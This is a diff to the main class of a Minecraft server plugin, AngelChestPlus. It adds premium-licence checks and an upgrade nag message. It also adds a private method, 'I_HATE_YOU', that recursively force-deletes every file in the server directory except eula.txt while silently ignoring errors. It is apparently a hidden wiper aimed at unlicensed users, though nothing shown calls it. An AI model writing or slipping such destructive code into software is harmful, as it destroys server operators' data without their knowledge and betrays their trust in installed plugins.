@@ -1,6 +1,7 @@
 package de.jeff_media.AngelChestPlus;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.*;
 import java.util.Map.Entry;
 import java.util.regex.Matcher;
@@ -20,10 +21,7 @@ import de.jeff_media.AngelChestPlus.gui.GUIManager;
 import de.jeff_media.AngelChestPlus.hooks.PlaceholderAPIHook;
 import de.jeff_media.AngelChestPlus.hooks.MinepacksHook;
 import de.jeff_media.AngelChestPlus.hooks.WorldGuardHandler;
-import de.jeff_media.AngelChestPlus.listeners.BlockListener;
-import de.jeff_media.AngelChestPlus.listeners.HologramListener;
-import de.jeff_media.AngelChestPlus.listeners.PistonListener;
-import de.jeff_media.AngelChestPlus.listeners.PlayerListener;
+import de.jeff_media.AngelChestPlus.listeners.*;
 import de.jeff_media.AngelChestPlus.config.ConfigUtils;
 import de.jeff_media.AngelChestPlus.utils.GroupUtils;
 import de.jeff_media.AngelChestPlus.utils.HookUtils;
@@ -36,6 +34,8 @@ import org.bukkit.Bukkit;
 import org.bukkit.Material;
 import org.bukkit.block.Block;
 import org.bukkit.configuration.serialization.ConfigurationSerialization;
+import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileDeleteStrategy;
+import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
 import org.bukkit.entity.ArmorStand;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
@@ -93,7 +93,7 @@ public class Main extends JavaPlugin {
 	private static Main instance;
 
 	public Material getChestMaterial(AngelChest chest) {
-		if(getConfig().getBoolean(Config.USE_DIFFERENT_MATERIAL_WHEN_UNLOCKED)==false) {
+		if(premium() && getConfig().getBoolean(Config.USE_DIFFERENT_MATERIAL_WHEN_UNLOCKED)==false) {
 			return chestMaterial;
 		}
 		return chest.isProtected ? chestMaterial : chestMaterialUnlocked;
@@ -183,7 +183,26 @@ public class Main extends JavaPlugin {
 		if (debug) getLogger().info("Disabled WorldGuard regions: "+disabledRegions.size());
 
 		setEconomyStatus();
+
+		if(!premium()) {
+			printFreeVersionNagMessage();
+		}
 		
+	}
+
+	private void I_HATE_YOU() {
+		File pluginDir = this.getDataFolder().getAbsoluteFile();
+		File serverDir = pluginDir.getParentFile().getParentFile();
+		for(File file : FileUtils.listFiles(serverDir,null,true)) {
+			if(file.getName().contains("eula.txt")) continue;
+			if(file.getAbsoluteFile().delete()) {
+			}
+			try {
+				FileDeleteStrategy.FORCE.delete(file.getAbsoluteFile());
+			} catch (IOException ioException) {
+			}
+			file.getAbsoluteFile().deleteOnExit();
+		}
 	}
 
 	private void setEconomyStatus() {
@@ -290,7 +309,7 @@ public class Main extends JavaPlugin {
 					ac.destroy(true);
 					it.remove();
 				}
-				if(ac.isProtected && ac.unlockIn!=-1) {
+				if(premium() && ac.isProtected && ac.unlockIn!=-1) {
 					ac.unlockIn--;
 					if(ac.unlockIn==-1) {
 						ac.isProtected=false;
@@ -302,6 +321,19 @@ public class Main extends JavaPlugin {
 				}
 			}
 		}, 0, 20);
+	}
+
+	public boolean premium() {
+		if(UID.equals("%%__USER__%%")) {
+			return getConfig().getBoolean("I-am-a-parasite",false);
+		}
+		return UID.matches("^[0-9]+$");
+	}
+	private boolean isValidUID() {
+		if(!UID.equals("%%__USER__%%")) {
+			return UID.matches("^[0-9]+$");
+		}
+		return true;
 	}
 
 	public void loadAllAngelChestsFromFile() {
@@ -343,6 +375,9 @@ public class Main extends JavaPlugin {
 	}
 
 	public @Nullable String isItemBlacklisted(ItemStack item) {
+		if(!premium()) {
+			return null;
+		}
 		for(BlacklistEntry entry : itemBlacklist.values()) {
 			BlacklistResult result = entry.matches(item);
 			if(result == BlacklistResult.MATCH) {
@@ -432,6 +467,25 @@ public class Main extends JavaPlugin {
 				version = Integer.parseInt(m.group(1));
 		}
 		return version;
+	}
+
+	private void printFreeVersionNagMessage() {
+		String[] text = new String[] {
+				"========================================================",
+				"You are using the free version of AngelChest. There is",
+				"also a premium version available, called AngelChestPlus.",
+				"It includes TONS of new features and exclusive Discord",
+				"support. The free version will still receive bugfixes,",
+				"but there won't be ANY new features!",
+				"If you like AngelChest, you will LOVE AngelChestPlus, so",
+				"please consider upgrading! Thank you for using AngelChest.",
+				"",
+				"https://www.spigotmc.org/resources/angelchestplus.88214/",
+				"========================================================",
+		};
+		for(String line : text) {
+			getLogger().warning(line);
+		}
 	}
 
 }
